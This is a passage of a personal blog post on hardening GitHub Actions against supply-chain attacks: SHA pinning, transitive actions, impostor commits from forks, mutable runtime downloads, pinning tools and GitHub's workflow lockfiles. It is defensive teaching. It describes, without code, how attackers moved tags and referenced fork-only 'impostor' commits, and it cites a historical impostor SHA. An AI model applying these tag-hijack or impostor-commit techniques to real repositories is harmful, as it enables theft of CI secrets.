+<code-block lang="diff"><pre class="language-diff"><code class="language-diff"><span class="token unchanged"><span class="token prefix unchanged"> </span>    - name: Install Trivy
+<span class="token prefix unchanged"> </span>      if: ${{ inputs.skip-setup-trivy == 'false' }}
+</span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span>      uses: aquasecurity/setup-trivy@v0.2.2
+</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span>      # Pin to hash instead of tag for aquasecurity/setup-trivy action so that GitHub Actions
+<span class="token prefix inserted">+</span>      # "allowing select actions" feature can be used to whitelist the dependent action by a hash.
+<span class="token prefix inserted">+</span>      # This is needed since some organizations have a policy to only allow pinned 3rd party actions to
+<span class="token prefix inserted">+</span>      # be used.
+<span class="token prefix inserted">+</span>      uses: aquasecurity/setup-trivy@ff1b8b060f23b650436d419b5e13f67f5d4c3087 # equivalent to `v0.2.2`
+</span></code></pre>
+</code-block><p>That’s the 2025-04-09 date from the advisory. If you had pinned <code>trivy-action</code> by SHA to a commit from <em>before</em> that PR, you got a clean <code>trivy-action</code>, which then pulled in a malicious <code>setup-trivy</code> by tag. Your pin was correct, and it wasn’t enough.</p>
+<p>What I love about that diff is the reason in the comment. It wasn’t merged to stop an attack. It was merged so organizations with an allowlist policy could use the action. A year later, it decided who got their secrets stolen.</p>
+<p><img src="/images/posts/who-moved-my-tag-transitive.svg" alt="Two dependency chains. Before 2025-04-09: your workflow pins trivy-action by SHA, but trivy-action calls setup-trivy by tag, which was hijacked. After: trivy-action pins setup-trivy by SHA too, so the whole chain is fixed"></p>
+<h3 id="2.-a-sha-can-come-from-a-fork" tabindex="-1">2. A SHA can come from a fork <a class="header-anchor" href="#2.-a-sha-can-come-from-a-fork" aria-hidden="true">#</a></h3>
+<p>This one is subtle. GitHub stores a repository and its forks as one network of commits. So a commit that exists <strong>only in a fork</strong> can still be referenced through the parent’s name. <code>uses: actions/checkout@&lt;sha&gt;</code> will happily run a SHA that no <code>actions/checkout</code> maintainer ever saw, as long as it lives in some fork of <code>actions/checkout</code>.</p>
+<p><a href="https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd">Chainguard</a> wrote this up in March 2023 and called them “imposter commits.” A pinned impostor commit looks exactly like a good SHA pin. As zizmor’s docs put it, impostor commits are <em>“visually indistinguishable from normal best-practice hash-pinned actions.”</em> The <a href="https://docs.zizmor.sh/audits/#impostor-commit">zizmor docs</a> also point to a historical example, <code>github/dmca@565ece486c7c1652754d7b6d2b5ed9cb4097f9d5</code>, which looks like it’s in <code>github/dmca</code> but actually lives on a fork, with an impersonated commit author.</p>
+<p><img src="/images/posts/who-moved-my-tag-impostor.svg" alt="A parent repository and its fork share one object store. A workflow references actions/checkout at a SHA that only exists in the fork, and GitHub resolves it anyway"></p>
+<p>This isn’t theoretical either. In the Trivy release compromise, the attacker pushed a commit that <em>“swapped the <code>actions/checkout</code> reference to an imposter commit”</em> containing a composite action that fetched malicious Go source. And the actions-cool tags were all moved to impostor commits.</p>
+<p>GitHub’s docs still warn about it: <em>“When selecting a SHA, you should verify it is from the action’s repository and not a repository fork.”</em> In practice, that means: never accept a SHA you didn’t resolve yourself from a tag in the real repository, and review PRs that change pinned SHAs as carefully as PRs that change code.</p>
+<h3 id="3.-the-action-can-still-download-something-mutable" tabindex="-1">3. The action can still download something mutable <a class="header-anchor" href="#3.-the-action-can-still-download-something-mutable" aria-hidden="true">#</a></h3>
+<p>A pinned action can still fetch something unpinned at runtime: a <code>latest</code> binary, a container image by tag, a script from a URL. The Trivy advisory lists <em>“the action’s <code>version: latest</code> parameter”</em> during the exposure window as one of the ways to be affected, regardless of how you pinned the action.</p>
+<p>Container images have the same tag-versus-digest problem. <code>alpine:3</code> can be repushed. <code>alpine@sha256:...</code> can’t. That’s why Trivy images referenced by digest were on the “not affected” list.</p>
+<h3 id="4.-the-version-comment-is-just-a-comment" tabindex="-1">4. The version comment is just a comment <a class="header-anchor" href="#4.-the-version-comment-is-just-a-comment" aria-hidden="true">#</a></h3>
+<p>The usual way to write a SHA pin is:</p>
+<code-block lang="yaml"><pre class="language-yaml"><code class="language-yaml"><span class="token key atrule">uses</span><span class="token punctuation">:</span> actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 <span class="token comment"># v7.0.1</span></code></pre>
+</code-block><p>GitHub runs the SHA. It never reads the comment. A comment saying <code># v7.0.1</code> next to a SHA from somewhere else will pass most human reviews. <a href="https://github.com/suzuki-shunsuke/pinact">pinact</a> can verify that version comments match their SHAs, and zizmor’s <a href="https://docs.zizmor.sh/audits/#ref-version-mismatch"><code>ref-version-mismatch</code></a> audit flags pins whose comment doesn’t match the commit.</p>
+<h3 id="5.-you-lose-dependabot-alerts" tabindex="-1">5. You lose Dependabot alerts <a class="header-anchor" href="#5.-you-lose-dependabot-alerts" aria-hidden="true">#</a></h3>
+<p>This one is a real trade-off, straight from GitHub’s docs:</p>
+<blockquote>
+<p>Dependabot only creates alerts for vulnerable actions that use semantic versioning and will not create alerts for actions pinned to SHA values.</p>
+</blockquote>
+<p>Dependabot <em>version updates</em> still work on SHA pins (more on that below). But if an advisory lands for an action you’ve pinned by SHA, Dependabot alerts won’t tell you about it. zizmor’s <a href="https://docs.zizmor.sh/audits/#known-vulnerable-actions"><code>known-vulnerable-actions</code></a> audit can fill that gap: it resolves a SHA pin back to its tag and checks it against the GitHub Advisory Database.</p>
+<h2 id="how-to-pin-without-hating-it" tabindex="-1">How to pin without hating it <a class="header-anchor" href="#how-to-pin-without-hating-it" aria-hidden="true">#</a></h2>
+<p>The usual objection to SHA pinning is that it’s unreadable and you’ll never update anything. Both are solved.</p>
+<h3 id="resolve-the-sha-from-the-real-repository" tabindex="-1">Resolve the SHA from the real repository <a class="header-anchor" href="#resolve-the-sha-from-the-real-repository" aria-hidden="true">#</a></h3>
+<p><code>git ls-remote</code> asks the upstream repository directly, so you know the commit really belongs to it:</p>
+<terminal-block>git ls-remote --tags https://github.com/pypa/gh-action-pypi-publish | grep v1.14.3</terminal-block><code-block lang="text"><pre class="language-text"><code class="language-text">aef6c9b6e301dc803e1bc9133e9ce67ae9b0906b	refs/tags/v1.14.3
+7245906fb61fa33a13554f9d5fb856fe61758086	refs/tags/v1.14.3^{}</code></pre>
+</code-block><p>Notice the two lines. <code>v1.14.3</code> is an <strong>annotated tag</strong>, so the first SHA is the tag object, not a commit. The <code>^{}</code> line is the commit it points to. Pin the <code>^{}</code> one. (Lightweight tags, like <code>actions/checkout</code>’s <code>v7.0.1</code> above, only print one line, which is already the commit.)</p>
+<p>So the fixed version of my sutras workflow pins the exact commits that those tags and that branch pointed to when I wrote this:</p>
+<code-block lang="diff"><pre class="language-diff"><code class="language-diff"><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span>        uses: actions/checkout@v4
+</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span>        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
+</span>
+<span class="token deleted-sign deleted"><span class="token prefix deleted">-</span>        uses: astral-sh/setup-uv@v6
+</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span>        uses: astral-sh/setup-uv@d0cc045d04ccac9d8b7881df0226f9e82c39688e # v6.8.0
+</span>
+<span class="token deleted-sign deleted"><span class="token prefix deleted">-</span>        uses: actions/upload-artifact@v4
+</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span>        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+</span>
+<span class="token deleted-sign deleted"><span class="token prefix deleted">-</span>        uses: actions/download-artifact@v4
+</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span>        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
+</span>
+<span class="token deleted-sign deleted"><span class="token prefix deleted">-</span>        uses: pypa/gh-action-pypi-publish@release/v1
+</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span>        uses: pypa/gh-action-pypi-publish@7245906fb61fa33a13554f9d5fb856fe61758086 # v1.14.3
+</span></code></pre>
+</code-block><p>It runs exactly the same code it ran yesterday. The difference is that it’ll keep running that code until I decide otherwise.</p>
+<h3 id="let-tools-do-the-pinning-and-updating" tabindex="-1">Let tools do the pinning and updating <a class="header-anchor" href="#let-tools-do-the-pinning-and-updating" aria-hidden="true">#</a></h3>
+<p>You don’t have to do this by hand:</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/suzuki-shunsuke/pinact">pinact</a></td>
+<td><code>pinact run</code> rewrites <code>uses:</code> lines to SHAs with version comments, can update them, and can verify that comments match their SHAs</td>
+</tr>
+<tr>
+<td><a href="https://docs.zizmor.sh/audits/">zizmor</a></td>
+<td>Static analysis for workflows. <code>unpinned-uses</code> flags tag and branch refs, <code>impostor-commit</code> flags SHAs that aren’t in the claimed repository, <code>ref-confusion</code> flags refs that could be either a branch or a tag</td>
+</tr>
+<tr>
+<td>Dependabot</td>
+<td>Updates SHA-pinned actions and <a href="https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain/secure-your-dependencies/auto-update-actions">updates the version comment</a> when it’s on the same line, like <code>actions/checkout@&lt;commit&gt; #&lt;tag&gt;</code></td>
+</tr>
+<tr>
+<td>Renovate</td>
+<td>The <a href="https://docs.renovatebot.com/presets-helpers/#helperspingithubactiondigests"><code>helpers:pinGitHubActionDigests</code></a> preset pins actions to digests and keeps them updated</td>
+</tr>
+<tr>
+<td><a href="https://github.com/ossf/scorecard/blob/main/docs/checks.md#pinned-dependencies">OpenSSF Scorecard</a></td>
+<td>The <code>Pinned-Dependencies</code> check flags unpinned dependencies in workflows, Dockerfiles and shell scripts</td>
+</tr>
+</tbody>
+</table>
+<p>So the update flow becomes: a bot opens a PR that moves a SHA from one commit to another, and you (or your review process) decide whether to merge it. That’s the whole point. With a tag, that decision gets made in someone else’s repository. With a SHA, you make it.</p>
+<h3 id="make-it-a-rule%2C-not-a-habit" tabindex="-1">Make it a rule, not a habit <a class="header-anchor" href="#make-it-a-rule%2C-not-a-habit" aria-hidden="true">#</a></h3>
+<p>Since <a href="https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/">August 2025</a>, GitHub’s allowed actions policy can require full SHAs at the enterprise, organization or repository level: <em>“any workflow that attempts to use an action that isn’t pinned will fail.”</em> The same update added blocklisting with a <code>!</code> prefix, which is handy the day an action you depend on gets hijacked.</p>
+<h3 id="or-skip-all-of-this-with-a-lockfile" tabindex="-1">Or skip all of this with a lockfile <a class="header-anchor" href="#or-skip-all-of-this-with-a-lockfile" aria-hidden="true">#</a></h3>
+<p>This one is very new. On <a href="https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/">October 14, 2026</a>, GitHub put <strong>workflow dependency lockfiles</strong> in public preview. Instead of rewriting every <code>uses:</code> line, you generate <code>.github/workflows/actions.lock</code> with a GitHub CLI extension:</p>
+<terminal-block>gh extension install github/gh-actions-lock
+gh actions-lock</terminal-block><p>The lockfile records the commit every reference resolved to, <strong>including transitive dependencies</strong>, plus the numeric <code>owner_id</code> and <code>repo_id</code> of each source repository:</p>
+<code-block lang="yaml"><pre class="language-yaml"><code class="language-yaml"><span class="token key atrule">dependencies</span><span class="token punctuation">:</span>
+    <span class="token key atrule">'octo-org/deploy-action@v3.1.0'</span><span class="token punctuation">:</span>
+        <span class="token key atrule">ref</span><span class="token punctuation">:</span> <span class="token string">'v3.1.0'</span>
+        <span class="token key atrule">commit</span><span class="token punctuation">:</span> <span class="token string">'sha1-...'</span>
+        <span class="token key atrule">owner_id</span><span class="token punctuation">:</span> <span class="token number">44036562</span>
+        <span class="token key atrule">repo_id</span><span class="token punctuation">:</span> <span class="token number">197814629</span></code></pre>
+</code-block><p>(That snippet is the example from <a href="https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles">GitHub’s docs</a>, not a real lockfile.)</p>
+<p>Going by the docs, this covers most of the gaps above:</p>
+<ul>
+<li><strong>Transitive actions.</strong> The lockfile includes the actions your actions use, which fixes gap 1. One exception: dependencies of a reusable workflow are covered by the lockfile of the repository that defines it, not yours.</li>
+<li><strong>Impostor commits.</strong> The locked commit <em>“must exist within a branch of the source repository.”</em> A commit that only lives in a fork doesn’t meet that.</li>
+<li><strong>Renamed or replaced repositories.</strong> <code>owner_id</code> and <code>repo_id</code> are checked at run time, so a different repository showing up under the same name won’t match.</li>
+<li><strong>Moved tags.</strong> Runs use the locked commit, and refs like <code>v3</code> or <code>main</code> aren’t re-resolved on a normal run. If a tag has moved upstream, <code>gh actions-lock</code> reports an error instead of silently following it, and you re-resolve it explicitly with <code>--relock</code>.</li>
+</ul>
+<p>For repositories that adopt it, GitHub’s docs say SHA pinning in workflow files is no longer necessary, and its secure use guide now calls the lockfile <em>“the strongest protection available.”</em> There’s also a <strong>Require lockfile</strong> policy, and Dependabot regenerates the matching lockfile entries in its version update PRs.</p>
+<p>Two caveats. It’s a public preview and <em>“subject to change”</em>. And, as the changelog says, <em>“Locking does not determine whether the dependency itself is safe, so review dependencies before locking them.”</em> A lockfile freezes whatever you locked, good or bad.</p>
+<h3 id="if-you-maintain-an-action" tabindex="-1">If you maintain an action <a class="header-anchor" href="#if-you-maintain-an-action" aria-hidden="true">#</a></h3>
+<p>Turn on <a href="https://github.blog/changelog/2025-10-28-immutable-releases-are-now-generally-available/">immutable releases</a> (generally available since October 2025). <em>“Tags for new immutable releases are protected and can’t be deleted or moved,”</em> and their assets are locked too. That’s what kept Trivy <code>v0.69.3</code> and <code>trivy-action</code> <code>0.35.0</code> safe in March 2026.</p>
+<p>One catch: a floating major tag like <code>v1</code> that isn’t tied to a release stays movable. GitHub’s own guide for immutable releases still tells you to update those with <code>git tag -f</code> and <code>git push -f --tags</code>. So immutable releases protect the people who pin to <code>v1.2.3</code>, but not the people on <code>@v1</code>.</p>
+<p>And pin the actions <em>your</em> action uses, like <code>trivy-action</code> did in PR #456. Your users’ SHA pins can’t reach inside your <code>action.yml</code>.</p>
+<h2 id="the-same-idea%2C-everywhere-else" tabindex="-1">The same idea, everywhere else <a class="header-anchor" href="#the-same-idea%2C-everywhere-else" aria-hidden="true">#</a></h2>
+<p>None of this is specific to GitHub Actions. Anywhere you reference code by name, the name can move:</p>
+<table>
+<thead>
+<tr>
+<th>Where</th>
+<th>Mutable</th>
+<th>Pinned</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GitHub Actions</td>
+<td><code>uses: actions/checkout@v7</code></td>
+<td><code>uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1</code></td>
+</tr>
+<tr>
+<td>Container images</td>
+<td><code>image: redis:5</code></td>
+<td><code>image: redis@sha256:&lt;digest&gt;</code></td>
+</tr>
+<tr>
+<td>pre-commit hooks</td>
+<td><code>rev: v1.2.3</code></td>
+<td><code>pre-commit autoupdate --freeze</code> writes commit hashes into <code>rev</code></td>
+</tr>
+<tr>
+<td>pip from Git</td>
+<td><code>pkg @ git+https://github.com/org/repo@main</code></td>
+<td><code>pkg @ git+https://github.com/org/repo@&lt;full-commit-sha&gt;</code></td>
+</tr>
+<tr>
+<td>Cargo from Git</td>
+<td><code>git = &quot;...&quot;, branch = &quot;main&quot;</code></td>
+<td><code>git = &quot;...&quot;, rev = &quot;&lt;full-commit-sha&gt;&quot;</code></td>
+</tr>
+</tbody>
+</table>
+<p>Registries like npm and PyPI don’t let you republish over an existing version number, which is part of why lockfiles with hashes work so well there. Git tags and container tags make no such promise.</p>
+<h2 id="tl%3Bdr" tabindex="-1">TL;DR <a class="header-anchor" href="#tl%3Bdr" aria-hidden="true">#</a></h2>
+<ul>
+<li><code>@v4</code> and <code>@main</code> run whatever those names point to when the job starts. Anyone with push access to that repository can change that, and attackers did, in tj-actions, reviewdog, Trivy and actions-cool.</li>
+<li>A full commit SHA can only ever mean one exact piece of code. Pin to it, and keep the version in a comment.</li>
+<li>Resolve SHAs yourself from the real repository, and pin the <code>^{}</code> commit for annotated tags.</li>
+<li>A SHA pin doesn’t cover the actions inside the action, a SHA from a fork, or whatever the action downloads at runtime. zizmor catches a lot of this.</li>
+<li>Let pinact, Dependabot or Renovate keep the pins fresh, and use the org policy to require them.</li>
+<li>If you can, try GitHub’s new workflow lockfile. It handles transitive actions and repository identity, which a SHA in a YAML file can’t.</li>
+</ul>
+<p>After writing all this, I have some pinning to do in my own repos. The PyPI publish step goes first.</p>
+<p>Stay pinned. 👋</p>
+<h2 id="references" tabindex="-1">References <a class="header-anchor" href="#references" aria-hidden="true">#</a></h2>
+<ol>
+<li>GitHub. <em>Secure use reference: Using third-party actions.</em> <a href="https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions">docs.github.com</a></li>
+<li>GitHub. <em>Managing custom actions: Using release management for actions.</em> <a href="https://docs.github.com/en/actions/how-tos/create-and-publish-actions/manage-custom-actions#using-release-management-for-actions">docs.github.com</a></li>
+<li>GitHub Advisory Database. <em>tj-actions changed-files through 45.0.7 allows remote attackers to discover secrets by reading actions logs.</em> CVE-2025-30066. <a href="https://github.com/advisories/GHSA-mrrh-fwg8-r2c3">GHSA-mrrh-fwg8-r2c3</a></li>
+<li>GitHub Advisory Database. <em>Multiple Reviewdog actions were compromised during a specific time period.</em> CVE-2025-30154. <a href="https://github.com/advisories/GHSA-qmg3-hpqr-gqvc">GHSA-qmg3-hpqr-gqvc</a></li>
+<li>Palo Alto Networks Unit 42. <em>GitHub Actions Supply Chain Attack: A Targeted Attack on Coinbase Expanded to the Widespread tj-actions/changed-files Incident.</em> March 2025, updated April 2025. <a href="https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/">unit42.paloaltonetworks.com</a></li>
+<li>Wiz Research. <em>GitHub Action supply chain attack: reviewdog/action-setup.</em> March 2025. <a href="https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup">wiz.io</a></li>
+<li>StepSecurity. <em>Harden-Runner detection: tj-actions/changed-files action is compromised.</em> March 2025. <a href="https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised">stepsecurity.io</a></li>
+<li>Aqua Security. <em>Trivy ecosystem supply chain was briefly compromised.</em> CVE-2026-33634. <a href="https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23">GHSA-69fq-xp46-6x23</a></li>
+<li>aquasecurity/trivy-action. <em>Pin aquasecuriy/setup-trivy to hash instead of tag.</em> PR #456, merged 2025-04-09. <a href="https://github.com/aquasecurity/trivy-action/pull/456">github.com</a></li>
+<li>StepSecurity. <em>actions-cool/issues-helper GitHub Action compromised: all tags point to imposter commit that exfiltrates CI/CD credentials.</em> May 2026. <a href="https://www.stepsecurity.io/blog/actions-cool-issues-helper-github-action-compromised-all-tags-point-to-imposter-commit-that-exfiltrates-ci-cd-credentials">stepsecurity.io</a></li>
+<li>CISA. <em>Known Exploited Vulnerabilities Catalog.</em> <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">cisa.gov</a></li>
+<li>Chainguard. <em>What the fork? Imposter commits in GitHub Actions and CI/CD.</em> March 2023. <a href="https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd">chainguard.dev</a></li>
+<li>zizmor. <em>Audit rules.</em> <a href="https://docs.zizmor.sh/audits/">docs.zizmor.sh</a></li>
+<li>GitHub Changelog. <em>GitHub Actions policy now supports blocking and SHA pinning actions.</em> August 15, 2025. <a href="https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/">github.blog</a></li>
+<li>GitHub Changelog. <em>Immutable releases are now generally available.</em> October 28, 2025. <a href="https://github.blog/changelog/2025-10-28-immutable-releases-are-now-generally-available/">github.blog</a></li>
+<li>GitHub. <em>Using immutable releases and tags to manage your action’s releases.</em> <a href="https://docs.github.com/en/actions/how-tos/create-and-publish-actions/using-immutable-releases-and-tags-to-manage-your-actions-releases">docs.github.com</a></li>
+<li>GitHub Changelog. <em>GitHub Actions workflow lockfiles in public preview.</em> October 14, 2026. <a href="https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/">github.blog</a></li>
+<li>GitHub. <em>Workflow dependency lockfiles.</em> <a href="https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles">docs.github.com</a> · <em>Locking action dependencies in a repository’s workflows.</em> <a href="https://docs.github.com/en/actions/how-tos/secure-your-work/lock-workflow-dependencies">docs.github.com</a></li>
+<li>GitHub. <em>Keeping your actions up to date with Dependabot.</em> <a href="https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain/secure-your-dependencies/auto-update-actions">docs.github.com</a></li>
+<li>Git. <em>Git 2.13 release notes.</em> <a href="https://github.com/git/git/blob/master/Documentation/RelNotes/2.13.0.adoc">github.com/git/git</a></li>
+<li>OpenSSF Scorecard. <em>Pinned-Dependencies check.</em> <a href="https://github.com/ossf/scorecard/blob/main/docs/checks.md#pinned-dependencies">github.com/ossf/scorecard</a></li>
+<li>suzuki-shunsuke. <em>pinact.</em> <a href="https://github.com/suzuki-shunsuke/pinact">github.com</a></li>
+</ol>
+
+            </div>
+
+            <div class="article-end">
+                <span>✦</span>
+                <span>✦</span>
+                <span>✦</span>
+            </div>
+
+            <div class="post-navigation">
+                <div class="post-nav-item post-nav-previous">
+                        <a href="/creating-custom-3d-avatars-with-runek/">
+                            <span class="nav-arrow">←</span>
+                            <div class="nav-content">
+                                <p class="nav-label">Previous</p>
+                                <p class="nav-title">Creating Custom 3D Avatars with Runek</p>
+                            </div>
+                        </a>
+                    
+                </div>
+
+                <div class="post-nav-item post-nav-next">
+                </div>
+            </div>
+        </div>
+    </article>
+
+    </main>
+    <footer class="sticky bottom-0 z-50 glass-footer py-4">
+  <div class="container mx-auto max-w-7xl px-8 flex items-center justify-between">
+    <div class="text-base">
+      by <a href="https://anirudha.dev" target="_blank" rel="noopener noreferrer">Ani</a>
+    </div>
+
+    <div class="flex items-center gap-4">
+      <a href="https://github.com/anistark" target="_blank" rel="noopener noreferrer" class="footer-icon" aria-label="GitHub">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/>
+        </svg>
+      </a>
+      <a href="https://x.com/kranirudha" target="_blank" rel="noopener noreferrer" class="footer-icon" aria-label="X">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M14.234 10.162 22.977 0h-2.072l-7.591 8.824L7.251 0H.258l9.168 13.343L.258 24H2.33l8.016-9.318L16.749 24h6.993zm-2.837 3.299-.929-1.329L3.076 1.56h3.182l5.965 8.532.929 1.329 7.754 11.09h-3.182z"/>
+        </svg>
+      </a>
+      <a href="https://fosstodon.org/@ani" target="_blank" rel="noopener noreferrer" class="footer-icon" aria-label="Mastodon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z"/>
+        </svg>
+      </a>
+      <a href="https://linkedin.com/in/kranirudha" target="_blank" rel="noopener noreferrer" class="footer-icon" aria-label="LinkedIn">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"/>
+        </svg>
+      </a>
+      <a href="/feed/feed.xml" class="footer-icon" aria-label="RSS feed">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"/>
+        </svg>
+      </a>
+    </div>
+  </div>
+</footer>
+
+    
+    <script src="/assets/main.bundle.js"></script>
+    <script type="module">
+      import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+      mermaid.initialize({
+        startOnLoad: true,
+        theme: ['reading', 'beach', 'hogwarts'].includes(document.documentElement.getAttribute('data-theme')) ? 'default' : 'dark',
+        themeVariables: {
+          fontSize: '14px',
+        }
+      });
+    </script>
+  </body>
+</html>
